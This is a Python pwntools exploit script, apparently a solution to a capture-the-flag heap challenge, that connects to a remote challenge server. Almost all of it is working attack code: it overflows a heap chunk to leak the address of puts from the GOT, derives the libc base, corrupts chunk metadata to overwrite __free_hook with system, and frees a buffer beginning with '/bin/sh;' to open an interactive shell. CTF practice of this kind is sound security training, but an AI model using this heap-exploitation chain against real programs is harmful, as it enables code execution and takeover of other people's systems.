#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *

import os
context.log_level = 'info'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 0 
elf = ELF('./pwn')
if local:
    io = process('./pwn')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    freehook = 0x1d98d0
else:
    io = remote('node2.buuoj.cn.wetolink.com', 28314)
    # io = process('./pwn', env={'LD_PRELOAD':'../libc-2.27-i386.so'})
    libc = ELF('../libc-2.27-i386.so')
    freehook = 0x1d68d0 

def add(sizeofDes, name, textlen, text):
    io.sendlineafter('Action: ', '0')
    io.sendlineafter('iption: ', str(sizeofDes))
    io.sendlineafter('name: ', name)
    io.sendlineafter('length: ', str(textlen))
    io.sendlineafter('text: ', text)

def delete(index):
    io.sendlineafter('Action: ', '1')
    io.sendlineafter('index: ', str(index))
    
def display(index):
    io.sendlineafter('Action: ', '2')
    io.sendlineafter('index: ', str(index))

def update(index, textlen, text):
    io.sendlineafter('Action: ', '3')
    io.sendlineafter('index: ', str(index))
    io.sendlineafter('length: ', str(textlen))
    io.sendlineafter('text: ', text)

if __name__ == '__main__':
    add(0x20, 'aaaa', 0x20, 'AAAA') # 0
    add(0x20, 'bbbb', 0x20, 'BBBB') # 1
    delete(0)
    payload = '/bin/sh;'.ljust(0x88, 'C') + p32(0) + p32(0x31) + 'B' * 0x28 + p32(0) + p32(0x91)
    payload += p32(elf.got['puts']) + 'bbbb'
    add(0x80, 'cccc', 0x88+0x30+0x90, payload) # 2
    display(1)
    io.recvuntil('description: ')
    putsaddr = u32(io.recv(4))
    libcbase = putsaddr - libc.sym['puts']
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    success('system', sys)
    freehook += libcbase
    success('freehook', freehook)
    # debug()
    
    add(0x30, 'aaaa', 0x30, 'AAAA') # 3
    add(0x30, 'bbbb', 0x30, 'BBBB') # 4
    delete(3)
    add(0x80, 'cccc', 0x80, 'CCCC') # 5
    delete(4)
    debug()
    payload = 'D' * 0x88 + p32(0) + p32(0x41)
    payload += p32(freehook) + 'E' * 0x34
    payload += p32(0) + p32(0x91) + p32(freehook+0x80)
    update(5, len(payload)+1, payload)

    add(0x30, 'aaaa', 4, 'AAAA') # 6
    payload = p32(sys)
    add(0x30, 'bbbb', 4, payload) # 7

    delete(2)







    io.interactive()
    io.close()



